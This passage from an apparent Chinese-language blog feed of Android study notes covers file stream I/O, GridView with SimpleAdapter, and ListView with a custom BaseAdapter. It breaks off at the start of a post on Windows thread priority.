<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">Write</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	FileOutputStream out = <span class="keyword">null</span>;</span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 *   正斜杠代表根目录</span></span><br><span class="line"><span class="comment">		 *   /data/data/   文件本机路径</span></span><br><span class="line"><span class="comment">		 * */</span></span><br><span class="line">		File file = Environment.getExternalStorageDirectory();</span><br><span class="line">		File file1 = getCacheDir();</span><br><span class="line">		File file2 = getFilesDir();</span><br><span class="line">		Log.d(<span class="string">"SD"</span>, file.getPath());</span><br><span class="line">		Log.d(<span class="string">"File Dir"</span>, file2.getPath());</span><br><span class="line">		Log.d(<span class="string">"File 缓存"</span>, file1.getPath());</span><br><span class="line">		<span class="comment">//out = new FileOutputStream("/data/data/com.example.android_study11/hello.txt");</span></span><br><span class="line">		out = <span class="keyword">new</span> FileOutputStream(file.getPath()+<span class="string">"Wker.txt"</span>);</span><br><span class="line">		out.write(<span class="string">"132"</span>.getBytes());</span><br><span class="line">	&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">		e.printStackTrace();</span><br><span class="line">	&#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">		<span class="keyword">if</span>(out != <span class="keyword">null</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">try</span> &#123;</span><br><span class="line">				out.close();</span><br><span class="line">			&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">				e.printStackTrace();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">Read</span> <span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	FileInputStream in = <span class="keyword">null</span>;</span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">		in = <span class="keyword">new</span> FileInputStream(<span class="string">"/data/data/com.example.android_study11/hello.txt"</span>);</span><br><span class="line">		<span class="keyword">byte</span>[] bytes = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">2014</span>];</span><br><span class="line">		<span class="keyword">int</span> len = in.read(bytes);</span><br><span class="line">		Log.d(<span class="string">"Wker"</span>, <span class="keyword">new</span> String(bytes,<span class="number">0</span>,len));</span><br><span class="line">	&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">		e.printStackTrace();</span><br><span class="line">	&#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">		<span class="keyword">if</span>(in != <span class="keyword">null</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">try</span> &#123;</span><br><span class="line">				in.close();</span><br><span class="line">			&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">				e.printStackTrace();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>就是基本的文件流操作，<code>/data/data/com.example.android_study11/</code>这个路径不是固定的，最好通过那个获取的函数获取。</p>
<p>而且如果有的时候我们还是无法读取文件，可能是文件权限不够，我们需要修改权限，就和Linux上面的一样，chmod修改权限就好，但是如果真机没有ROOT权限的话呢我们就需要先ROOT，然后用sudo进行操作。</p>
]]></content>
      <categories>
        <category>Android学习</category>
      </categories>
      <tags>
        <tag>Android学习</tag>
      </tags>
  </entry>
  <entry>
    <title>Android GridView</title>
    <url>/2020/02/13/Android-GridView/</url>
    <content><![CDATA[<h2 id="网格视图"><a href="#网格视图" class="headerlink" title="网格视图"></a>网格视图</h2><p>就是一个控件，在这个控件中类似于列表框控件，可以添加一个个小的视图，其实用起来就和一个格子一个格子的列表控件一样。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">RelativeLayout</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:tools</span>=<span class="string">"http://schemas.android.com/tools"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:paddingBottom</span>=<span class="string">"@dimen/activity_vertical_margin"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:paddingLeft</span>=<span class="string">"@dimen/activity_horizontal_margin"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:paddingRight</span>=<span class="string">"@dimen/activity_horizontal_margin"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:paddingTop</span>=<span class="string">"@dimen/activity_vertical_margin"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">tools:context</span>=<span class="string">"com.example.android_study10.MainActivity"</span> &gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">GridView</span> </span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/gridview"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:numColumns</span>=<span class="string">"3"</span></span></span><br><span class="line"><span class="tag">	    <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">	    <span class="attr">android:layout_height</span>=<span class="string">"match_parent"</span>        </span></span><br><span class="line"><span class="tag">        &gt;</span><span class="tag">&lt;/<span class="name">GridView</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">RelativeLayout</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>布局比较简单，numColumns这个属性就是设置一行有几个格子。<br>布局完这个之后就来布局每个项目的布局。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">LinearLayout</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:gravity</span>=<span class="string">"center_horizontal"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:orientation</span>=<span class="string">"vertical"</span> &gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">ImageView</span> </span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/imageView"</span></span></span><br><span class="line"><span class="tag">	    <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">	    <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">	    <span class="attr">android:src</span>=<span class="string">"@drawable/ic_launcher"</span>        </span></span><br><span class="line"><span class="tag">        /&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">TextView</span> </span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/textview"</span></span></span><br><span class="line"><span class="tag"> 	    <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">	    <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">	    <span class="attr">android:text</span>=<span class="string">"Wker"</span>       </span></span><br><span class="line"><span class="tag">        /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>这个就是一个上面图片，下面文字的一个布局，用来存储每个项目。<br>接下来我们来编写代码。</p>
<p>首先我们先来定义控件和一个图片资源数组：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> ListAdapter ad;</span><br><span class="line"><span class="keyword">private</span> GridView Gv1;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">int</span>[] images = &#123;R.drawable.ic_launcher,R.drawable.ic_launcher,R.drawable.ic_launcher,R.drawable.ic_launcher,R.drawable.ic_launcher,R.drawable.ic_launcher,R.drawable.ic_launcher,R.drawable.ic_launcher,R.drawable.ic_launcher&#125;;</span><br></pre></td></tr></table></figure>
<p>为了简单起见，我就放了几个自带的图片。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Gv1 = (GridView) findViewById(R.id.gridview);</span><br><span class="line">ad = getAdapter();</span><br><span class="line">Gv1.setAdapter(ad);</span><br></pre></td></tr></table></figure>
<p>然后我们初始化控件，再设置一个适配器。<br>适配器获取的代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> ListAdapter <span class="title">getAdapter</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	List&lt;HashMap&lt;String,Object&gt;&gt; list = <span class="keyword">new</span> ArrayList&lt;HashMap&lt;String,Object&gt;&gt;();</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; images.length; i++) &#123;</span><br><span class="line">		HashMap&lt;String,Object&gt; hm = <span class="keyword">new</span> HashMap&lt;String,Object&gt;();</span><br><span class="line">		hm.put(<span class="string">"txt"</span>, <span class="string">"Wker"</span>+i);</span><br><span class="line">		hm.put(<span class="string">"img"</span>, images[i]);</span><br><span class="line">		list.add(hm);</span><br><span class="line">	&#125;</span><br><span class="line">	SimpleAdapter adapter = <span class="keyword">new</span> SimpleAdapter(<span class="keyword">this</span>, list, R.layout.item, <span class="keyword">new</span> String[] &#123;<span class="string">"txt"</span>,<span class="string">"img"</span>&#125;, <span class="keyword">new</span> <span class="keyword">int</span>[] &#123;R.id.textview,R.id.imageView&#125;);</span><br><span class="line">	<span class="keyword">return</span> adapter;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先先定义一个HashMap的列表，一个文字对应一个组件数据。<br>然后我们用for循环逐渐添加，最后我们初始化这个SimpleAdapter，比较重要的就是最后两个控件，是一一对应的，我之前也说过，那个R.layout.item就是我们的项目布局。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Gv1.setOnItemClickListener(<span class="keyword">new</span> OnItemClickListener() &#123;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onItemClick</span><span class="params">(AdapterView&lt;?&gt; parent, View view, <span class="keyword">int</span> position, <span class="keyword">long</span> id)</span> </span>&#123;</span><br><span class="line">		Toast.makeText(MainActivity.<span class="keyword">this</span>, (CharSequence) ((HashMap&lt;String,Object&gt;)((SimpleAdapter)ad).getItem(position)).get(<span class="string">"txt"</span>), Toast.LENGTH_SHORT).show();;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>添加个事件，注意的是，我们的适配器的某个项目使我们集合中的某个元素，这样我们就能够实现了，而且ListAdapter是SimpleAdapter的父类。<br><img src="img1.jpg" alt="实现效果"></p>
]]></content>
      <categories>
        <category>Android学习</category>
      </categories>
      <tags>
        <tag>Android学习</tag>
      </tags>
  </entry>
  <entry>
    <title>Android ListView</title>
    <url>/2020/02/12/Android-ListView/</url>
    <content><![CDATA[<h1 id="ListView控件"><a href="#ListView控件" class="headerlink" title="ListView控件"></a>ListView控件</h1><p>这个控件就是一个列表框控件，比较的常见，基本每个软件都有的。</p>
<h2 id="控件性质"><a href="#控件性质" class="headerlink" title="控件性质"></a>控件性质</h2><p>其实这个和之前的那个下拉框和文本提示框基本上性质一样，都是控件-适配器-数据，这三个东西构成的。</p>
<h2 id="简单适配器"><a href="#简单适配器" class="headerlink" title="简单适配器"></a>简单适配器</h2><p>其实这里说的简单，是指的适配器比较简单，用安卓给我们提供的适配器：android.R.layout.simple_list_item_1。<br>布局：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">RelativeLayout</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:tools</span>=<span class="string">"http://schemas.android.com/tools"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:paddingBottom</span>=<span class="string">"@dimen/activity_vertical_margin"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:paddingLeft</span>=<span class="string">"@dimen/activity_horizontal_margin"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:paddingRight</span>=<span class="string">"@dimen/activity_horizontal_margin"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:paddingTop</span>=<span class="string">"@dimen/activity_vertical_margin"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">tools:context</span>=<span class="string">"com.example.android_study9.MainActivity"</span> &gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">ListView</span> </span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/Lv"</span></span></span><br><span class="line"><span class="tag">	    <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">	    <span class="attr">android:layout_height</span>=<span class="string">"match_parent"</span>        </span></span><br><span class="line"><span class="tag">        </span></span><br><span class="line"><span class="tag">        &gt;</span><span class="tag">&lt;/<span class="name">ListView</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">RelativeLayout</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>布局的话呢就是一个列表框。<br>代码实现方面的话呢，也是比较简单的。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> ArrayAdapter&lt;String&gt; adapter = <span class="keyword">new</span> ArrayAdapter&lt;String&gt;(<span class="keyword">this</span>, android.R.layout.simple_list_item_1,getData());</span><br><span class="line">Lv.setAdapter(adapter);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> String[] getData()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">new</span> String[]&#123;<span class="string">"a"</span>,<span class="string">"b"</span>,<span class="string">"c"</span>,<span class="string">"d"</span>&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="自定义适配器"><a href="#自定义适配器" class="headerlink" title="自定义适配器"></a>自定义适配器</h2><p>这个是我们比较关注的，因为功能强大而且漂亮。</p>
<p>首先我们需要一个布局：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">RelativeLayout</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span> &gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">ImageView</span> </span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/iv_ava"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"40dip"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"40dip"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:src</span>=<span class="string">"@drawable/ic_launcher"</span></span></span><br><span class="line"><span class="tag">        /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">TextView</span> </span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/tx_name"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">"Wker"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_toRightOf</span>=<span class="string">"@+id/iv_ava"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_centerVertical</span>=<span class="string">"true"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_marginLeft</span>=<span class="string">"70dip"</span></span></span><br><span class="line"><span class="tag">        /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">TextView</span> </span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/tx_des"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">"最帅的男人"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_centerVertical</span>=<span class="string">"true"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_toRightOf</span>=<span class="string">"@+id/tx_name"</span></span></span><br><span class="line"><span class="tag">        /&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;/<span class="name">RelativeLayout</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="img1.jpg" alt="实现效果"></p>
<p>这个时候我们需要给他们ID，因为我们需要在后面用到。<br>主布局的话呢和简单的是一样的。</p>
<p>然后因为我们是自定义的适配器，所以我们需要自己设置一个继承于适配器的一个类。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.android_study9.adapter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.example.android_study9.R;</span><br><span class="line"><span class="keyword">import</span> com.example.android_study9.model.finendmodel;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.view.ViewGroup;</span><br><span class="line"><span class="keyword">import</span> android.widget.BaseAdapter;</span><br><span class="line"><span class="keyword">import</span> android.widget.ImageView;</span><br><span class="line"><span class="keyword">import</span> android.widget.TextView;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FriendsAdapter</span> <span class="keyword">extends</span> <span class="title">BaseAdapter</span></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> List&lt;finendmodel&gt; mData;</span><br><span class="line">	<span class="keyword">private</span> Context ctx;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">FriendsAdapter</span><span class="params">(Context ctx,List&lt;finendmodel&gt; mData)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.ctx = ctx;</span><br><span class="line">		<span class="keyword">this</span>.mData = mData;</span><br><span class="line">		</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getCount</span><span class="params">()</span> </span>&#123;<span class="comment">//决定列表的个数</span></span><br><span class="line">		<span class="keyword">return</span> mData.size();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> Object <span class="title">getItem</span><span class="params">(<span class="keyword">int</span> arg0)</span> </span>&#123;<span class="comment">//根据arg0获取对应Item的数据</span></span><br><span class="line">		<span class="keyword">return</span> mData.get(arg0);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">getItemId</span><span class="params">(<span class="keyword">int</span> arg0)</span> </span>&#123;<span class="comment">//根据arg0获取对应Item的ID</span></span><br><span class="line">		<span class="keyword">return</span> arg0;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> View <span class="title">getView</span><span class="params">(<span class="keyword">int</span> arg0, View arg1, ViewGroup arg2)</span> </span>&#123;<span class="comment">//创建列表的Item视图</span></span><br><span class="line">		View v = arg1;</span><br><span class="line">		holder h = <span class="keyword">null</span>;</span><br><span class="line">		<span class="keyword">if</span>(v == <span class="keyword">null</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			v = View.inflate(ctx, R.layout.picture, <span class="keyword">null</span>);</span><br><span class="line">			h = <span class="keyword">new</span> holder();</span><br><span class="line">			h.iv_ava = (ImageView) v.findViewById(R.id.iv_ava);</span><br><span class="line">			h.tx_name = (TextView) v.findViewById(R.id.tx_name);</span><br><span class="line">			h.tx_des = (TextView) v.findViewById(R.id.tx_des);</span><br><span class="line">			v.setTag(h);</span><br><span class="line">		&#125;<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			h = (holder) v.getTag();</span><br><span class="line">		&#125;</span><br><span class="line">		finendmodel f = mData.get(arg0);</span><br><span class="line">		h.iv_ava.setImageResource(f.getImgId());</span><br><span class="line">		h.tx_name.setText(f.getName());</span><br><span class="line">		h.tx_des.setText(f.getDes());</span><br><span class="line">		<span class="keyword">return</span> v;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">holder</span></span></span><br><span class="line"><span class="class">	</span>&#123;</span><br><span class="line">		<span class="keyword">private</span> ImageView iv_ava;</span><br><span class="line">		<span class="keyword">private</span> TextView tx_name;</span><br><span class="line">		<span class="keyword">private</span> TextView tx_des;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>说难的话呢也不是很难，但也不算是简单，首先构造方法中需要传递一个设备上下文，需要一个List的泛型数据，这个泛型的类是：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.android_study9.model;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">finendmodel</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">int</span>  imgId;</span><br><span class="line">	<span class="keyword">private</span> String name;</span><br><span class="line">	<span class="keyword">private</span> String des;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getImgId</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> imgId;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setImgId</span><span class="params">(<span class="keyword">int</span> imgId)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.imgId = imgId;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> name;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.name = name;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">getDes</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> des;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setDes</span><span class="params">(String des)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.des = des;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>主要是用来存储我们的图片ID，名称和说明的。<br>getCount的话呢返回我们的List的个数，也就是我们的项目数目，getItem的话呢就是返回当前这个项目的数据，getItemId的话呢就是返回Item的ID，其实也及时把他的参数返回回去就好了（一般是），最关键的就是getView这个方法。<br>首先我们先是构造了一个内部类，这个内部类是静态的，目的是为了能够更好的释放内存，类里面存储了我们需要用到的数据，在我们的getView中，我们需要返回当前Item项目的一个View视图，这个视图我们通过： <code>View.inflate(ctx, R.layout.picture, null);</code>来获取，第二个参数，是我们自定义的一个布局。<br>然后我们new了一个我们的内部类，用于存储对应的控件，然后设置标签给这个View，为什么要这么做呢？因为我们如果每加载一个项目，都要加载布局，然后找控件，占用的资源太多了，而且速度慢，这个时候安卓提供给我们一个缓存机制，也就是参数传递给我们的<code>View arg1</code>，如果这个不为null，就是当前项目的一个缓存，这个时候我们只需要判断是不是为null，不是的话呢就用之前的这个项目，那么我们的内存就会比较的快了，为什么可以这样，因为我们缓存的也就是当我们往下滑动，看不到的那部分丢弃的，这个时候，再通过这个内部类，我们就可以实现一个减少内存的一个效果了，然后我们设置空间属性，最后将我们的View返回回去。<br>构造完毕这个类之后我们编写主窗体：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">mAdapter = <span class="keyword">new</span> FriendsAdapter(<span class="keyword">this</span>, getData1());</span><br><span class="line">Lv = (ListView) findViewById(R.id.Lv);</span><br><span class="line">Lv.setAdapter(mAdapter);</span><br></pre></td></tr></table></figure>
<p>getData就是用来返回数据的。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> List&lt;finendmodel&gt; <span class="title">getData1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	List&lt;finendmodel&gt; list = <span class="keyword">new</span> ArrayList&lt;finendmodel&gt;();</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">20</span>; i++) &#123;</span><br><span class="line">		finendmodel f = <span class="keyword">new</span> finendmodel();</span><br><span class="line">		f.setDes(<span class="string">"Wker"</span>+i);</span><br><span class="line">		f.setName(<span class="string">"Wker"</span>+i+i);</span><br><span class="line">		f.setImgId(R.drawable.ic_launcher);</span><br><span class="line">		list.add(f);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> list;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其实也就是返回回去一个finendmodel泛型的List集合，然后我们可以增加两个点击事件：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Lv.setOnItemClickListener(<span class="keyword">new</span> OnItemClickListener() &#123;</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onItemClick</span><span class="params">(AdapterView&lt;?&gt; arg0, View arg1, <span class="keyword">int</span> arg2, <span class="keyword">long</span> arg3)</span> </span>&#123;</span><br><span class="line">		String txt = ((finendmodel)mAdapter.getItem(arg2)).getName();</span><br><span class="line">		Toast.makeText(MainActivity.<span class="keyword">this</span>, txt, Toast.LENGTH_SHORT).show();;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;);</span><br><span class="line">Lv.setOnItemLongClickListener(<span class="keyword">new</span> OnItemLongClickListener() &#123;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">onItemLongClick</span><span class="params">(AdapterView&lt;?&gt; arg0, View arg1, <span class="keyword">int</span> arg2, <span class="keyword">long</span> arg3)</span> </span>&#123;</span><br><span class="line">		String txt = ((finendmodel)mAdapter.getItem(arg2)).getDes();</span><br><span class="line">		Toast.makeText(MainActivity.<span class="keyword">this</span>, txt, Toast.LENGTH_SHORT).show();</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">true</span>;<span class="comment">//是否执行单击，true不执行</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>看名字就知道了，第一个是单击，第二个是长按，需要注意的是长按的返回值决定了是否允许点击事件。<br><code>mAdapter.getItem(arg2)</code>这个getItem方法使我们自己重写的，返回的也就是项目，以为我们知道这个返回来的就是一个finendmodel，我们可以强转，然后再从里面获取数据就好了。<br><img src="img1.jpg" alt="效果图"></p>
]]></content>
      <categories>
        <category>Android学习</category>
      </categories>
      <tags>
        <tag>Android学习</tag>
      </tags>
  </entry>
  <entry>
    <title>线程相关操作</title>
    <url>/2020/02/11/%E7%BA%BF%E7%A8%8B%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C/</url>
    <content><![CDATA[<h1 id="线程操作"><a href="#线程操作" class="headerlink" title="线程操作"></a>线程操作</h1><p>回过头来再看一下这个东西，还是有那么几点是需要注意的。</p>
<h2 id="线程优先级"><a href="#线程优先级" class="headerlink" title="线程优先级"></a>线程优先级</h2><p>就是线程的一个操作级别，分为很多种，高级别的先运行低级别的后运行（其实有32个，但是Windows提供的接口就那么几个）。<br><code>SetThreadPriority</code>通过这个函数就可以设置。<br>看下面的操作实例：</p>
